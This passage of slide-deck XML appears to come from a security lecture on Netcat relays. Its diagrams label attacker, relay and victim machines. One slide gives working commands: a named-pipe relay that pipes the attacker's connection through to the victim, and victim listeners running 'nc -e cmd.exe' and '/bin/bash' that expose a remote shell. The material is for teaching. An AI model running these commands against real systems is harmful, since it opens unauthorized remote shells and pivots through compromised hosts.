        <p:nvSpPr>
          <p:cNvPr id="228" name="Google Shape;228;p1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29" name="Google Shape;229;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="607019" y="3780582"/>
            <a:ext cx="1033310" cy="83099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Netcat (client mode initiates a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="230" name="Google Shape;230;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2796146" y="3780583"/>
            <a:ext cx="1033310" cy="83099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Netcat (listen mode waits for a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="231" name="Google Shape;231;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5288050" y="3780582"/>
            <a:ext cx="1033310" cy="83099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Netcat (client mode initiates a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="232" name="Google Shape;232;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7585398" y="3756931"/>
            <a:ext cx="1033310" cy="83099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Netcat (listen mode waits for a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="233" name="Google Shape;233;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4523362" y="3852153"/>
            <a:ext cx="116732" cy="642026"/>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4" name="Google Shape;234;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1640329" y="4183626"/>
            <a:ext cx="326123" cy="83574"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj2"/>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5" name="Google Shape;235;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2470023" y="4193364"/>
            <a:ext cx="326123" cy="83574"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj2"/>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6" name="Google Shape;236;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6321360" y="4193364"/>
            <a:ext cx="326123" cy="83574"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj2"/>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7" name="Google Shape;237;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7255293" y="4198499"/>
            <a:ext cx="326123" cy="83574"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj2"/>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8" name="Google Shape;238;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5624052" y="5200084"/>
            <a:ext cx="933283" cy="388374"/>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39" name="Google Shape;239;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5579806" y="5200084"/>
            <a:ext cx="11798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backpipe</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="240" name="Google Shape;240;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="499460" y="3163164"/>
            <a:ext cx="1066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Standard In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="241" name="Google Shape;241;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2731679" y="3163164"/>
            <a:ext cx="1066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Standard In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="242" name="Google Shape;242;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5190093" y="3163164"/>
            <a:ext cx="1066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Standard In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="243" name="Google Shape;243;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7500229" y="3110600"/>
            <a:ext cx="1066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Standard In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="244" name="Google Shape;244;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="573529" y="4553753"/>
            <a:ext cx="1066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Standard Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="245" name="Google Shape;245;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2779401" y="4557488"/>
            <a:ext cx="1066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Standard Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="246" name="Google Shape;246;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5249811" y="4553753"/>
            <a:ext cx="1066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Standard Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="247" name="Google Shape;247;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581416" y="4537586"/>
            <a:ext cx="1066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Standard Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="Google Shape;248;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6134548" y="4915352"/>
            <a:ext cx="8455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1&gt;</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="249" name="Google Shape;249;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4268508" y="3440163"/>
            <a:ext cx="124264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PIPE</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="250" name="Google Shape;250;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2731679" y="2838133"/>
            <a:ext cx="12732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0&lt;</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="251" name="Google Shape;251;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525292" y="2424500"/>
            <a:ext cx="118478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Attacker types here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="252" name="Google Shape;252;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525292" y="5244166"/>
            <a:ext cx="1361767"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Attacker sees the result here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="253" name="Google Shape;253;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7486650" y="2207367"/>
            <a:ext cx="118970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Responses from shell are here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="254" name="Google Shape;254;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7562384" y="5244166"/>
            <a:ext cx="125361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Shell gets commands here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="255" name="Google Shape;255;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1531857"/>
            <a:ext cx="139618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Attacker Machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="256" name="Google Shape;256;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3820995" y="1530929"/>
            <a:ext cx="138634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Relay Machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="257" name="Google Shape;257;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7229024" y="1495280"/>
            <a:ext cx="139618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Victim Machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="258" name="Google Shape;258;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280219" y="2344994"/>
            <a:ext cx="1686233" cy="3903406"/>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59" name="Google Shape;259;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7151935" y="2256503"/>
            <a:ext cx="1599639" cy="399189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0" name="Google Shape;260;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3068678" y="2806106"/>
            <a:ext cx="11798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backpipe</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="261" name="Google Shape;261;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3068678" y="2864373"/>
            <a:ext cx="1126995" cy="282778"/>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62" name="Google Shape;262;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3846201" y="6571391"/>
            <a:ext cx="45719"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263" name="Google Shape;263;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2236839" y="2344994"/>
            <a:ext cx="4586748" cy="3903406"/>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1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Netcat Relay Case #2: Client-Client Relay on Linux</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="269" name="Google Shape;269;p16"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1402620" y="2475835"/>
            <a:ext cx="6338760" cy="3050918"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="270" name="Google Shape;270;p1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17"/>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Netcat Relay Case #2 – cont'd</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="276" name="Google Shape;276;p17"/>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chemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Attacker machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc -l -p 2222</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-57150" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Relay</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># mknod backpipe p</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc Attacker's_IP 2222 0&lt;backpipe | nc Victim's_IP 4444 1&gt;backpipe</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-57150" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Victim machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>C:\&gt; nc -l -p 4444 -e cmd.exe</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>$ nc –l –p 4444 –e /bin/bash</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="277" name="Google Shape;277;p1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8"/>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Client-Client Relay in Picture</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="284" name="Google Shape;284;p1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
        <p:nvSpPr>
          <p:cNvPr id="285" name="Google Shape;285;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="607019" y="3780582"/>
            <a:ext cx="1033310" cy="83099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Netcat (listen mode waits for a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="286" name="Google Shape;286;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2796146" y="3780583"/>
            <a:ext cx="1033310" cy="83099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Netcat (client mode initiates a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="287" name="Google Shape;287;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5288050" y="3780582"/>
            <a:ext cx="1033310" cy="83099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Netcat (client mode initiates a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="288" name="Google Shape;288;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7585398" y="3756931"/>
            <a:ext cx="1033310" cy="830997"/>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200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Netcat (listen mode waits for a connection)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="289" name="Google Shape;289;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4523362" y="3852153"/>
            <a:ext cx="116732" cy="642026"/>
          </a:xfrm>
          <a:prstGeom prst="rect">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0" name="Google Shape;290;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6321360" y="4193364"/>
            <a:ext cx="326123" cy="83574"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj2"/>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1" name="Google Shape;291;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7255293" y="4198499"/>
            <a:ext cx="326123" cy="83574"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj2"/>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2" name="Google Shape;292;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5624052" y="5200084"/>
            <a:ext cx="933283" cy="388374"/>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293" name="Google Shape;293;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5579806" y="5200084"/>
            <a:ext cx="1179871"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backpipe</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="294" name="Google Shape;294;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="499460" y="3163164"/>
            <a:ext cx="1066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Standard In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="295" name="Google Shape;295;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2731679" y="3163164"/>
            <a:ext cx="1066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Standard In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="296" name="Google Shape;296;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5190093" y="3163164"/>
            <a:ext cx="1066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Standard In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="297" name="Google Shape;297;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7500229" y="3110600"/>
            <a:ext cx="1066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Standard In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="Google Shape;298;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="573529" y="4553753"/>
            <a:ext cx="1066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Standard Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="299" name="Google Shape;299;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2779401" y="4557488"/>
            <a:ext cx="1066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Standard Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="300" name="Google Shape;300;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5249811" y="4553753"/>
            <a:ext cx="1066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Standard Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="301" name="Google Shape;301;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
